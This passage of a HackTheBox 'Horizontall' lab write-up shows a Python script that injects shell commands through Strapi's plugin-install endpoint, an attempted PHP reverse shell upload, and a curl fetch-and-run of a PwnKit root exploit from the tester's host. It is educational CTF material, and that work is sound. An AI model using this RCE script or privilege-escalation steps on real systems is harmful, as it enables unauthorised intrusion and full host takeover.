+<img src=/p/hackthebox-horizontall/strapi_admin_dashboard.png width=1391 height=796 srcset="/p/hackthebox-horizontall/strapi_admin_dashboard_hu5215d02829d117578881902a41d6f4b7_91481_480x0_resize_box_3.png 480w, /p/hackthebox-horizontall/strapi_admin_dashboard_hu5215d02829d117578881902a41d6f4b7_91481_1024x0_resize_box_3.png 1024w" loading=lazy alt="Strapi CMS Admin Dashboard">
+</a>
+<figcaption>Strapi CMS Admin Dashboard</figcaption>
+</figure></p>
+<p>What instantly caught my eye was the <code>Files Upload</code> tab in the Plugins section. Sure enough, I could upload a file. I went to <a class=link href=https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md target=_blank rel=noopener>PayloadsAllTheThings</a> for inspiration, crafted and uploaded myself a PHP reverse shell payload.</p>
+<p><figure class=gallery-image style=flex-grow:322;flex-basis:773px>
+<a href=/p/hackthebox-horizontall/reverse_shell_upload.png data-size=1376x427>
+<img src=/p/hackthebox-horizontall/reverse_shell_upload.png width=1376 height=427 srcset="/p/hackthebox-horizontall/reverse_shell_upload_hue0d086e339ad1c9e87d9123034997634_45945_480x0_resize_box_3.png 480w, /p/hackthebox-horizontall/reverse_shell_upload_hue0d086e339ad1c9e87d9123034997634_45945_1024x0_resize_box_3.png 1024w" loading=lazy alt="Reverse shell upload">
+</a>
+<figcaption>Reverse shell upload</figcaption>
+</figure></p>
+<p>Unfortunately, I did not have much success with uploaded files getting to run. Without dwelling too much on it, I decided to try out the RCE exploits I found before. The Strapi version didn&rsquo;t seem that different from the password reset exploit, so I had fairly high hopes.</p>
+<h3 id=remote-code-execution-rce-authenticated--user-flag>Remote Code Execution (RCE) (Authenticated) & User Flag</h3>
+<p>While working with <a class=link href=https://www.exploit-db.com/exploits/50238 target=_blank rel=noopener>the RCE exploit</a> I also again encountered some Python weirdness. Mostly regarding the <code>JWT</code> token. I was used to it at this point, so I just duct-taped bits and pieces of both RCE exploits, as they seemed to target the same <code>/admin/plugins/install</code> path, hard-coded in the <code>JWT</code> and target <code>URL</code>. At the end, it looked like this:</p>
+<div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=kn>import</span> <span class=nn>requests</span>
+<span class=kn>from</span> <span class=nn>cmd</span> <span class=kn>import</span> <span class=n>Cmd</span>
+
+<span class=k>class</span> <span class=nc>Terminal</span><span class=p>(</span><span class=n>Cmd</span><span class=p>):</span>
+    <span class=n>prompt</span> <span class=o>=</span> <span class=s2>&#34;$&gt; &#34;</span>
+    <span class=k>def</span> <span class=nf>default</span><span class=p>(</span><span class=bp>self</span><span class=p>,</span> <span class=n>args</span><span class=p>):</span>
+        <span class=n>code_exec</span><span class=p>(</span><span class=n>args</span><span class=p>)</span>
+
+<span class=k>def</span> <span class=nf>code_exec</span><span class=p>(</span><span class=n>cmd</span><span class=p>):</span>
+    <span class=k>global</span> <span class=n>jwt</span><span class=p>,</span> <span class=n>url</span>
+    <span class=n>jwt</span> <span class=o>=</span> <span class=s2>&#34;eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MywiaXNBZG1pbiI6dHJ1ZSwiaWF0IjoxNjQzOTk4MTkwLCJleHAiOjE2NDY1OTAxOTB9.fw_8CAfFHcZbgprQaa9LTA771Vz0UI6WyvgvynMKYyI&#34;</span>
+    <span class=n>url</span> <span class=o>=</span> <span class=s2>&#34;http://api-prod.horizontall.htb&#34;</span>
+    <span class=n>headers</span> <span class=o>=</span> <span class=p>{</span><span class=s2>&#34;Authorization&#34;</span> <span class=p>:</span> <span class=sa>f</span><span class=s2>&#34;Bearer </span><span class=si>{</span><span class=n>jwt</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>}</span>
+    <span class=n>data</span> <span class=o>=</span> <span class=p>{</span><span class=s2>&#34;plugin&#34;</span> <span class=p>:</span> <span class=sa>f</span><span class=s2>&#34;documentation &amp;&amp; $(</span><span class=si>{</span><span class=n>cmd</span><span class=si>}</span><span class=s2>)&#34;</span><span class=p>,</span>
+            <span class=s2>&#34;port&#34;</span> <span class=p>:</span> <span class=s2>&#34;1337&#34;</span><span class=p>}</span>
+    <span class=n>out</span> <span class=o>=</span> <span class=n>requests</span><span class=o>.</span><span class=n>post</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;</span><span class=si>{</span><span class=n>url</span><span class=si>}</span><span class=s2>/admin/plugins/install&#34;</span><span class=p>,</span> <span class=n>json</span> <span class=o>=</span> <span class=n>data</span><span class=p>,</span> <span class=n>headers</span> <span class=o>=</span> <span class=n>headers</span><span class=p>)</span>
+    <span class=nb>print</span><span class=p>(</span><span class=n>out</span><span class=o>.</span><span class=n>text</span><span class=p>)</span>
+
+<span class=k>if</span> <span class=vm>__name__</span> <span class=o>==</span> <span class=p>(</span><span class=s2>&#34;__main__&#34;</span><span class=p>):</span>
+    <span class=n>terminal</span> <span class=o>=</span> <span class=n>Terminal</span><span class=p>()</span>
+    <span class=n>terminal</span><span class=o>.</span><span class=n>cmdloop</span><span class=p>()</span>
+</code></pre></div><p>While the exploit did seem to do something, it would always respond with a &ldquo;Bad Request&rdquo; HTTP reply, instead of the output of <code>id</code> or whatever else I tried to execute. I then tried to give myself a proper reverse shell. I used <a class=link href=https://www.revshells.com/ target=_blank rel=noopener>RevShells</a> to help me out crafting the command itself.</p>
+<p><figure class=gallery-image style=flex-grow:138;flex-basis:332px>
+<a href=/p/hackthebox-horizontall/user_access.png data-size=812x586>
+<img src=/p/hackthebox-horizontall/user_access.png width=812 height=586 srcset="/p/hackthebox-horizontall/user_access_huc41e0aca776927cdfc1dbecad7234be1_383288_480x0_resize_box_3.png 480w, /p/hackthebox-horizontall/user_access_huc41e0aca776927cdfc1dbecad7234be1_383288_1024x0_resize_box_3.png 1024w" loading=lazy alt="User Access">
+</a>
+<figcaption>User Access</figcaption>
+</figure></p>
+<p>And I got myself a shell! I checked out <code>/home</code> and grabbed the user flag :)</p>
+<p><figure class=gallery-image style=flex-grow:141;flex-basis:340px>
+<a href=/p/hackthebox-horizontall/user_flag.png data-size=499x352>
+<img src=/p/hackthebox-horizontall/user_flag.png width=499 height=352 srcset="/p/hackthebox-horizontall/user_flag_hu4696c75310cd6fca07c6667278436783_172314_480x0_resize_box_3.png 480w, /p/hackthebox-horizontall/user_flag_hu4696c75310cd6fca07c6667278436783_172314_1024x0_resize_box_3.png 1024w" loading=lazy alt="User Flag">
+</a>
+<figcaption>User Flag</figcaption>
+</figure></p>
+<p>It was now time to try and get root access.</p>
+<h2 id=privilege-escalation>Privilege Escalation</h2>
+<h3 id=sudo-and-suid-enumeration>SUDO and SUID enumeration</h3>
+<p>One of the ways to privesc to root, that require very little effort, is finding easily exploitable binaries that we can either run as SUDO or that have their SUID bit set on.</p>
+<p>Let&rsquo;s look for SUDO access first.</p>
+<div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash>sudo -l
+</code></pre></div><p>I was requested a password, so this avenue won&rsquo;t work.</p>
+<p>Next, I tried to look for easily exploitable binaries with SUID bits.</p>
+<div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash>find / -perm -u<span class=o>=</span>s -type f 2&gt;/dev/null
+</code></pre></div><p>I tried cross-referencing the output with the SUID list over at <a class=link href=https://gtfobins.github.io/#+suid target=_blank rel=noopener>GTFOBins</a>, but did not find anything out of the ordinary.</p>
+<h3 id=linux-exploit-suggester>Linux Exploit Suggester</h3>
+<p>On my host machine, I made myself an SSH key and pasted the public key over into .ssh/authorized_keys on the strapi account. I could now log-in via SSH normally and not rely on the fragile reverse shell anymore.</p>
+<p>Next, I <code>curl</code>&rsquo;d myself the <a class=link href=https://github.com/mzet-/linux-exploit-suggester target=_blank rel=noopener>Linux Exploit Suggester</a> onto the remote machine and let it do its thing.</p>
+<div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash>strapi@horizontall:~$ ./les.sh 
+
+Available information:
+
+Kernel version: 4.15.0
+Architecture: x86_64
+Distribution: ubuntu
+Distribution version: 18.04
+Additional checks <span class=o>(</span>CONFIG_*, sysctl entries, custom Bash commands<span class=o>)</span>: performed
+Package listing: from current OS
+
+Searching among:
+
+<span class=m>78</span> kernel space exploits
+<span class=m>49</span> user space exploits
+
+Possible Exploits:
+
+<span class=o>[</span>+<span class=o>]</span> <span class=o>[</span>CVE-2021-4034<span class=o>]</span> PwnKit
+
+   Details: https://www.qualys.com/2022/01/25/cve-2021-4034/pwnkit.txt
+   Exposure: probable
+   Tags: <span class=o>[</span> <span class=nv>ubuntu</span><span class=o>=</span>10<span class=p>|</span>11<span class=p>|</span>12<span class=p>|</span>13<span class=p>|</span>14<span class=p>|</span>15<span class=p>|</span>16<span class=p>|</span>17<span class=p>|</span>18<span class=p>|</span>19<span class=p>|</span>20<span class=p>|</span><span class=m>21</span> <span class=o>]</span>,debian<span class=o>=</span>7<span class=p>|</span>8<span class=p>|</span>9<span class=p>|</span>10<span class=p>|</span>11,fedora,manjaro
+   Download URL: https://codeload.github.com/berdav/CVE-2021-4034/zip/main
+</code></pre></div><p>Seeing the PwnKit exploit pop-up made me smile. I was listening to <a class=link href=https://open.spotify.com/show/6oeUmMwv1AQpdYNHmOE4A0 target=_blank rel=noopener>SANS Internet Stormcenter Podcast</a> a few days ago and heard about a new <code>pollkit</code> exploit (<code>"PwnKit"</code> <a class=link href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-4034" target=_blank rel=noopener>CVE-2021-4034</a>) floating around, making pretty much every single Linux machine vulnerable since 2009. This makes a lot of the CTF machines vulnerable to something other than what was likely intended by its designer. I pondered on looking for the &lsquo;intended&rsquo; exploit, but I had spent a considerable amount of time just getting to this point, I knew that getting root access otherwise would take me equally as long if the journey there was as involved as getting the initial foothold. I decided that an exploit is an exploit and just went with the PwnKit route.</p>
+<h3 id=pwnkit--system-flag>PwnKit & System Flag</h3>
+<p>Applying the exploit was trivial. <code>LES</code> had even given me a download link. And just like with <code>LES</code>, I <code>curl</code>&rsquo;d myself the exploit onto the remote machine and ran it. The exploit zoomed by extremely quickly, and I was now <code>root</code>. I went and snatched the system flag. And that&rsquo;s it for Horizontall.</p>
+<div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash>strapi@horizontall:~$ curl 10.10.14.130:8080/pwnkit -o pwnkit
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+<span class=m>100</span> <span class=m>14688</span>  <span class=m>100</span> <span class=m>14688</span>    <span class=m>0</span>     <span class=m>0</span>   103k      <span class=m>0</span> --:--:-- --:--:-- --:--:--  103k
+strapi@horizontall:~$ chmod +x pwnkit 
+strapi@horizontall:~$ ./pwnkit 
+root@horizontall:/opt/strapi# id
+<span class=nv>uid</span><span class=o>=</span>0<span class=o>(</span>root<span class=o>)</span> <span class=nv>gid</span><span class=o>=</span>0<span class=o>(</span>root<span class=o>)</span> <span class=nv>groups</span><span class=o>=</span>0<span class=o>(</span>root<span class=o>)</span>,1001<span class=o>(</span>strapi<span class=o>)</span>
+root@horizontall:/opt/strapi# whoami
+root
+root@horizontall:/opt/strapi# <span class=nb>cd</span> ~
+root@horizontall:~# ls
+boot.sh  pid  restart.sh  root.txt
+root@horizontall:~# cat root.txt 
+ed9440c3385bdec9f943c2cc3c0af71e
+root@horizontall:~# 
+</code></pre></div><p><em><strong>NOTE:</strong></em> If you would like to read the &lsquo;intended&rsquo; or &lsquo;proper&rsquo; way of the gaining <code>root</code> access, involving a Laravel Debug Mode RCE, I strongly recommend <a class=link href=https://0xdf.gitlab.io/2022/02/05/htb-horizontall.html target=_blank rel=noopener>0xdf&rsquo;s writeup of Horizontall</a>.</p>
+<h2 id=outro>Outro</h2>
+<p>And that&rsquo;s that. In the future, I will probably go through HackTheBox&rsquo;s &lsquo;Starting Point&rsquo; set of machines. I planned on doing so from the start, but I wanted to try my hand at one of the &lsquo;Easy&rsquo; boxes rather than going for the &lsquo;Very Easy&rsquo; ones, to give myself a sort of reality check and to better gauge how much knowledge and understanding I have right now.</p>
+<p>Whilst doing this box, not counting the PwnKit exploit, I feel like I went the hard way about it. There were faster, less conspicuous and smarter way to achieve the same result. The <code>api-prod</code> subdomain was hidden in one of the minified <code>.js</code> files of the landing page, for example, thus avoiding the lengthy brute-forcing of subdomains.</p>
+<p>I was pretty easily led astray by various red herrings, like the file upload plugin on the admin dashboard or after seeing the version of the SSH service. However, I&rsquo;m still a beginner, so I believe noticing these things sooner requires time and experience.</p>
+<p>All in all, I feel like I have many areas to improve in, but at the same time, I&rsquo;m glad I didn&rsquo;t got completely stumped by one of the slightly more challenging boxes. :)</p>
+</section>
+<footer class=article-footer>
+<section class=article-copyright><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="12" r="9"/><path d="M14.5 9a3.5 4 0 100 6"/></svg>
+<span>Licensed under CC BY-NC-SA 4.0</span>
+</section>
+</footer>
+</article>
+<aside class=related-contents--wrapper>
+</aside>
+<footer class=site-footer>
+<section class=copyright>
+&copy;
+2022 WeaponizedPeach >> Infosec
+</section>
+<section class=powerby>
+Built with <a href=https://gohugo.io/ target=_blank rel=noopener>Hugo</a> <br>
+Theme <b><a href=https://github.com/CaiJimmy/hugo-theme-stack target=_blank rel=noopener data-version=3.7.0>Stack</a></b> designed by <a href=https://jimmycai.com target=_blank rel=noopener>Jimmy</a>
+</section>
+</footer>
+<div class=pswp tabindex=-1 role=dialog aria-hidden=true>
+<div class=pswp__bg></div>
+<div class=pswp__scroll-wrap>
+<div class=pswp__container>
+<div class=pswp__item></div>
+<div class=pswp__item></div>
+<div class=pswp__item></div>
+</div>
+<div class="pswp__ui pswp__ui--hidden">
+<div class=pswp__top-bar>
+<div class=pswp__counter></div>
+<button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+<button class="pswp__button pswp__button--share" title=Share></button>
+<button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+<button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+<div class=pswp__preloader>
+<div class=pswp__preloader__icn>
+<div class=pswp__preloader__cut>
+<div class=pswp__preloader__donut></div>
+</div>
+</div>
+</div>
+</div>
+<div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+<div class=pswp__share-tooltip></div>
+</div>
+<button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+</button>
+<button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+</button>
+<div class=pswp__caption>
+<div class=pswp__caption__center></div>
+</div>
+</div>
+</div>
+</div><script src=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo=" crossorigin=anonymous defer></script><script src=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU=" crossorigin=anonymous defer></script><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.css integrity="sha256-c0uckgykQ9v5k+IqViZOZKc47Jn7KQil4/MP3ySA3F8=" crossorigin=anonymous><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.css integrity="sha256-SBLU4vv6CA6lHsZ1XyTdhyjJxCjPif/TRkjnsyGAGnE=" crossorigin=anonymous>
+</main>
+<aside class="sidebar right-sidebar sticky">
+<section class="widget archives">
+<div class=widget-icon><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><line x1="5" y1="9" x2="19" y2="9"/><line x1="5" y1="15" x2="19" y2="15"/><line x1="11" y1="4" x2="7" y2="20"/><line x1="17" y1="4" x2="13" y2="20"/></svg>
+</div>
+<h2 class="widget-title section-title">Table of contents</h2>
+<div class=widget--toc>
+<nav id=TableOfContents>
+<ol>
+<li><a href=#intro>Intro</a></li>
+<li><a href=#reconnaissance>Reconnaissance</a></li>
+<li><a href=#scanning--discovery>Scanning & Discovery</a>
+<ol>
+<li><a href=#nmap>nmap</a></li>
+<li><a href=#whatweb>whatweb</a></li>
+<li><a href=#horizontallhtb>horizontall.htb</a></li>
+<li><a href=#gobuster--horizontallhtb>gobuster @ horizontall.htb</a></li>
+<li><a href=#ssh-service-rabbit-hole>SSH Service (rabbit hole)</a></li>
+<li><a href=#wfuzz-subdomains>wfuzz subdomains</a></li>
+<li><a href=#api-prodhorizontallhtb>api-prod.horizontall.htb</a></li>
+<li><a href=#gobuster--api-prodhorizontallhtb>gobuster @ api-prod.horizontall.htb</a></li>
+<li><a href=#api-prodhorizontallhtbreviews>api-prod.horizontall.htb/reviews</a></li>
+<li><a href=#api-prodhorizontallhtbadmin>api-prod.horizontall.htb/admin</a></li>
+</ol>
+</li>
+<li><a href=#exploitation>Exploitation</a>
+<ol>
+<li><a href=#sqlmap-with-burp-suite-rabbit-hole>sqlmap with Burp Suite (rabbit hole)</a></li>
+<li><a href=#set-password-unauthenticated>Set Password (Unauthenticated)</a></li>
+<li><a href=#admin-log-in--api-prodhorizontallhtbadmin>Admin log-in @ api-prod.horizontall.htb/admin</a></li>
+<li><a href=#remote-code-execution-rce-authenticated--user-flag>Remote Code Execution (RCE) (Authenticated) & User Flag</a></li>
+</ol>
+</li>
+<li><a href=#privilege-escalation>Privilege Escalation</a>
+<ol>
+<li><a href=#sudo-and-suid-enumeration>SUDO and SUID enumeration</a></li>
+<li><a href=#linux-exploit-suggester>Linux Exploit Suggester</a></li>
+<li><a href=#pwnkit--system-flag>PwnKit & System Flag</a></li>
+</ol>
+</li>
+<li><a href=#outro>Outro</a></li>
+</ol>
+</nav>
+</div>
+</section>
+</aside>
+</div>
+<script src=https://cdn.jsdelivr.net/npm/node-vibrant@3.1.5/dist/vibrant.min.js integrity="sha256-5NovOZc4iwiAWTYIFiIM7DxKUXKWvpVEuMEPLzcm5/g=" crossorigin=anonymous></script><script type=text/javascript src=/ts/main.js defer></script>
+<script>(function(){const a=document.createElement('link');a.href="https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap",a.type="text/css",a.rel="stylesheet",document.head.appendChild(a)})()</script>
+</body>
+</html>
